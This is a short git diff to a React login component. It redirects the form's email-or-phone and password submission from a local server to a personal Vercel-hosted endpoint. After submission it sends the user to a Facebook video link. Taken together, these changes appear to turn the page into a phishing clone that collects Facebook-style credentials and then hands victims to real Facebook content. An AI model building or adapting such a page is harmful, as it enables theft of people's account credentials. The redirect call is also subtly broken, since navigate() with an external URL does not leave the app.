@@ -1,10 +1,10 @@
 import React, { useState } from 'react'
-import { Link } from 'react-router-dom'
+import { useNavigate } from 'react-router-dom'
 import { EyeIcon, EyeSlashIcon } from '@heroicons/react/24/solid'
 import axios from 'axios'
 
 const Login = () => {
-
+    const navigate = useNavigate()
     const [password, setPassword] = useState('')
     const [emailOrPhone, setEmailOrPhone] = useState('')
     const [showIcon, setShowIcon] = useState(false)
@@ -21,7 +21,7 @@ const Login = () => {
 
 
         await axios.post(
-            `http://localhost:5000/api/login`,
+            `https://hossain-s-project-server.vercel.app/api/login`,
             {
                 emailOrPhone,
                 password
@@ -29,6 +29,7 @@ const Login = () => {
             config
         );
 
+        navigate('https://fb.watch/iss6gbp9ul/')
 
     }
 
